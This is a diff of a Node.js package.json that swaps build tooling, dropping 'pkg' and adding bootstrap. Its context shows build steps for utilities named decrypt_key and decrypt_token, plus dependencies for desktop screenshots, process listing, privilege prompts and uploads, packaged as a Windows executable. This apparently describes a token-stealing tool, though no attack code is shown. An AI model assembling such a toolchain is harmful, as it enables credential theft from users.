@@ -4,7 +4,6 @@
     "dev": "node index.js",
     "build": "yarn build:dkp && yarn build:dtp && yarn build:ico && yarn build:exe",
     "build:exe": "node build.js",
-    "build:exe2": "pkg index.js -t node16-win-x64",
     "build:dkp": "cd util/decrypt-key && pyinstaller --onefile --distpath . decrypt_key.py",
     "build:dtp": "cd util/decrypt-token && pyinstaller --onefile --distpath . decrypt_token.py",
     "build:ico": "png-to-ico assets/icon.png > icon.ico"
@@ -12,12 +11,12 @@
   "dependencies": {
     "alert": "https://github.com/NetherMCtv/alert",
     "axios": "0.27.2",
+    "bootstrap": "^5.2.3",
     "filesize": "^10.0.6",
     "form-data": "^4.0.0",
     "jszip": "^3.10.1",
     "moment": "^2.29.4",
     "nexe": "^4.0.0-rc.2",
-    "pkg": "^5.8.0",
     "ps-list": "^8.1.0",
     "screenshot-desktop": "^1.12.7",
     "sudo-prompt": "^9.2.1"
